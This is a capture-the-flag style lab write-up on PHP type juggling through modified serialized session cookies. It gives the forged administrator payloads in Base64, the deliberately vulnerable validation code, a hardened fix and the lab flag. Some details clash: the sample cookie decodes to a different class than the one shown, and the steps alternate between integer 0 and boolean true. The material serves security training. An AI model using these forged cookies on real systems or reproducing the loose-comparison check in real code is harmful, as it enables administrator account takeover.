# Lab 02: Modifying Serialized Data Types

## Lab Information

| Property | Value |
|----------|-------|
| **Category** | Insecure Deserialization |
| **Lab Type** | Modifying serialized data types |
| **Difficulty** | Practitioner |
| **CWE** | CWE-502: Deserialization of Untrusted Data |
| **OWASP** | A8:2021 - Software and Data Integrity Failures |

---

## Overview

This lab exploits PHP's loose comparison behavior when validating serialized session data. The application stores user session information as a serialized PHP object in a cookie, including an `access_token` field. The server validates this token using loose comparison (`==`), which is vulnerable to type juggling attacks.

### Key Vulnerability

PHP's loose comparison (`==`) performs type coercion before comparison. This creates two attack vectors:

1. **Boolean `true`** (Works in PHP 7 & 8): When comparing `true` with any non-empty string, the result is `TRUE`
2. **Integer `0`** (PHP 7 only): When comparing `0` with a non-numeric string, PHP 7 converts the string to `0`

```php
// Vulnerable code
if ($sessionData->access_token == $user['access_token']) {
    // Authentication passes when access_token is boolean true
}
```

> **Note:** PHP 8.0+ changed type juggling behavior. Use boolean `true` for compatibility.

### Attack Chain

1. Login with valid credentials (`wiener:peter`)
2. Observe the serialized session cookie structure
3. Modify the cookie to impersonate another user
4. Change `access_token` from string to integer `0`
5. Access admin panel with forged session
6. Delete user `carlos` to complete the lab

---

## Step-by-Step Walkthrough

### Step 1: Access the Lab

Navigate to the lab login page and authenticate with the provided test credentials:
- **Username:** `wiener`
- **Password:** `peter`

### Step 2: Capture the Session Cookie

After login, examine the `session` cookie. It's Base64-encoded:

```
TzoxNDoiU2VyaWFsaXplZFVzZXIiOjI6e3M6ODoidXNlcm5hbWUiO3M6Njoid2llbmVyIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO3M6NjQ6ImNhZmViYWJlMDk4NzY1NDMyMWZlZGNiYTk4NzY1NDMyMTBmZWRjYmEwOTg3NjU0MzIxZmVkY2JhOTg3NjU0MzIiO30=
```

### Step 3: Decode the Cookie

Base64 decode reveals a serialized PHP object:

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:64:"cafebabe0987654321fedcba9876543210fedcba0987654321fedcba98765432";}
```

**Understanding the format:**
- `O:4:"User"` - Object of class "User" with 4-character name
- `2:{...}` - Object has 2 properties
- `s:8:"username";s:6:"wiener"` - String property "username" = "wiener"
- `s:12:"access_token";s:64:"..."` - String property "access_token" (64 chars)

### Step 4: Craft the Exploit Payload

Modify the serialized object to:
1. Change `username` to `administrator`
2. Change `access_token` from string to boolean `true`

**Modified payload (PHP 7 & 8 compatible):**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";b:1;}
```

**Key changes:**
- `s:6:"wiener"` → `s:13:"administrator"` (username change)
- `s:64:"..."` → `b:1` (string to boolean `true` type change)

**Alternative payload (PHP 7 only):**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

### Step 5: Encode and Send

Base64 encode the modified payload:

**Boolean `true` (recommended - works on all PHP versions):**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2I6MTt9
```

**Integer `0` (PHP 7 only):**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

Replace the `session` cookie with this value and navigate to `/admin.php`.

### Step 6: Complete the Lab

Access the admin panel with administrator privileges and delete the user `carlos`. This triggers the lab completion.

---

## Why The Exploit Works

### PHP Type Juggling

PHP's loose comparison (`==`) performs automatic type conversion before comparing values. This behavior creates security vulnerabilities when comparing user-controlled data.

**Type Coercion Rules (PHP 7):**
| Comparison | Result | Reason |
|------------|--------|--------|
| `0 == "hello"` | TRUE | String "hello" becomes 0 |
| `0 == "123abc"` | FALSE | String "123abc" becomes 123 |
| `"0" == "00"` | TRUE | Both convert to integer 0 |
| `0 == ""` | TRUE | Empty string becomes 0 |
| `0 == null` | TRUE | null becomes 0 |

**Type Coercion Rules (PHP 8+):**
| Comparison | Result | Reason |
|------------|--------|--------|
| `0 == "hello"` | **FALSE** | Integer converts to "0", strings compared |
| `true == "hello"` | TRUE | Non-empty string is truthy |
| `true == ""` | FALSE | Empty string is falsy |
| `true == "0"` | FALSE | "0" is treated as falsy |

**Why strings become 0:**
When PHP converts a non-numeric string to an integer, it takes the leading numeric portion. If there is none, the result is `0`:

```php
(int)"hello" === 0       // No leading digits
(int)"123abc" === 123    // Takes "123"
(int)"3.14test" === 3    // Takes "3" (integer cast)
```

### The Attack Logic

```
                            Attacker's Cookie
                                   |
                                   v
              +--------------------------------------------+
              |  O:4:"User":2:{                            |
              |    s:8:"username";s:13:"administrator";    |
              |    s:12:"access_token";b:1;                |  <-- Boolean true
              |  }                                         |
              +--------------------------------------------+
                                   |
                                   v
                        PHP unserialize()
                                   |
                                   v
              +--------------------------------------------+
              |  $sessionData->access_token = true         |  <-- Boolean
              +--------------------------------------------+
                                   |
                                   v
                    Server fetches administrator's token
                                   |
                                   v
              +--------------------------------------------+
              |  $user['access_token'] = "a1b2c3d4..."     |  <-- String
              +--------------------------------------------+
                                   |
                                   v
                        Loose Comparison (==)
                                   |
                                   v
              +--------------------------------------------+
              |  true == "a1b2c3d4..."                     |
              |                                            |
              |  PHP evaluates: non-empty string is truthy |
              |  Boolean comparison: true == true          |
              |                                            |
              |  Result: TRUE ✓                            |
              +--------------------------------------------+
                                   |
                                   v
                    AUTHENTICATION BYPASS!
```

---

## Vulnerable Code Analysis

### config.php - Vulnerable Validation

```php
// VULNERABLE: Uses loose comparison (==)
function validateSession() {
    global $pdo;
    
    if (!isset($_COOKIE['session'])) {
        return false;
    }
    
    $sessionData = @unserialize(base64_decode($_COOKIE['session']));
    if (!$sessionData || !isset($sessionData->username) || !isset($sessionData->access_token)) {
        return false;
    }
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$sessionData->username]);
    $user = $stmt->fetch();
    
    if (!$user) {
        return false;
    }
    
    // VULNERABILITY: Loose comparison allows type juggling
    if ($sessionData->access_token == $user['access_token']) {
        return $user;  // Comparison passes with integer 0!
    }
    
    return false;
}
```

**Problems:**
1. Uses `unserialize()` on user input without validation
2. Uses loose comparison (`==`) instead of strict comparison
3. No type validation on `access_token`
4. No integrity verification (HMAC/signature)

---

## Secure Code Implementation

### Secure Version

```php
// SECURE: Uses strict comparison (===) and type validation
function validateSession() {
    global $pdo;
    
    if (!isset($_COOKIE['session'])) {
        return false;
    }
    
    // Decode and unserialize with error handling
    $decoded = base64_decode($_COOKIE['session'], true);
    if ($decoded === false) {
        return false;
    }
    
    $sessionData = @unserialize($decoded, ['allowed_classes' => ['User']]);
    if (!$sessionData instanceof User) {
        return false;
    }
    
    // Validate required fields exist
    if (!isset($sessionData->username) || !isset($sessionData->access_token)) {
        return false;
    }
    
    // TYPE VALIDATION: Ensure access_token is a string
    if (!is_string($sessionData->access_token)) {
        return false;
    }
    
    // LENGTH VALIDATION: Access token must be 64 chars
    if (strlen($sessionData->access_token) !== 64) {
        return false;
    }
    
    // FORMAT VALIDATION: Access token must be hex
    if (!ctype_xdigit($sessionData->access_token)) {
        return false;
    }
    
    $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->execute([$sessionData->username]);
    $user = $stmt->fetch();
    
    if (!$user) {
        return false;
    }
    
    // SECURE: Strict comparison AND timing-safe comparison
    if (hash_equals($user['access_token'], $sessionData->access_token)) {
        return $user;
    }
    
    return false;
}
```

**Security Improvements:**
1. `allowed_classes` parameter limits deserialization
2. `is_string()` validates token type before comparison
3. `strlen()` validates token length
4. `ctype_xdigit()` validates token format
5. `hash_equals()` prevents timing attacks
6. `instanceof` validates object type

### Best Practices

**Alternative Approaches:**

1. **Server-Side Sessions:**
   ```php
   session_start();
   $_SESSION['user_id'] = $user['id'];
   // Session data never leaves server
   ```

2. **HMAC-Signed Tokens:**
   ```php
   $data = base64_encode(serialize($user));
   $signature = hash_hmac('sha256', $data, $secret_key);
   $cookie = $data . '.' . $signature;
   ```

3. **JWT Tokens:**
   ```php
   use Firebase\JWT\JWT;
   $token = JWT::encode($payload, $key, 'HS256');
   ```

---

## Code Comparison

### Side-by-Side Analysis

| Aspect | Vulnerable | Secure |
|--------|------------|--------|
| Comparison | `==` (loose) | `===` / `hash_equals()` |
| Type check | None | `is_string()` |
| Length check | None | `strlen() === 64` |
| Format check | None | `ctype_xdigit()` |
| Classes | All allowed | Whitelist with `allowed_classes` |
| Instance check | None | `instanceof User` |

### Vulnerable Pattern

```php
// BAD: No validation, loose comparison
$data = unserialize(base64_decode($_COOKIE['session']));
if ($data->token == $dbToken) { ... }
```

### Secure Pattern

```php
// GOOD: Type validation, strict comparison
$data = unserialize($input, ['allowed_classes' => ['User']]);
if (!$data instanceof User) return false;
if (!is_string($data->token)) return false;
if (!hash_equals($dbToken, $data->token)) return false;
```

---

## References

- [CWE-502: Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
- [PHP Type Comparison Tables](https://www.php.net/manual/en/types.comparisons.php)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PortSwigger Insecure Deserialization](https://portswigger.net/web-security/deserialization)

---

## Lab Files

| File | Purpose |
|------|---------|
| `config.php` | Database connection and vulnerable session validation |
| `index.php` | Lab entry point with login navigation |
| `login.php` | User authentication, creates serialized cookie |
| `my-account.php` | Displays decoded session cookie |
| `admin.php` | Admin panel with user deletion |
| `logout.php` | Session termination |
| `success.php` | Lab completion verification |
| `lab-description.php` | Challenge description |
| `docs.php` | Interactive documentation |
| `setup_db.php` | Database initialization |
| `database_setup.sql` | SQL schema |

---

## Flag

Upon successful completion: `FLAG{php_type_juggling_0_equals_any_string}`
